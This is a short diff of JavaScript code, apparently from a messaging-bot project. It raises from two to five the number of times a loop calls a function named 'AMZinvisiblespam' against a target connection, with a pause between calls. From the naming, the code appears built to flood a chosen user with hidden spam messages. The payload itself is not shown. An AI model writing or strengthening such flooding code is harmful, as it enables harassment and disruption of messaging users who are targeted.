@@ -3593,7 +3593,7 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 2; i++) {
+            for (let i = 0; i < 5; i++) {
                 try {
                     await AMZinvisiblespam(sock, target);
                     await sleep(1500)
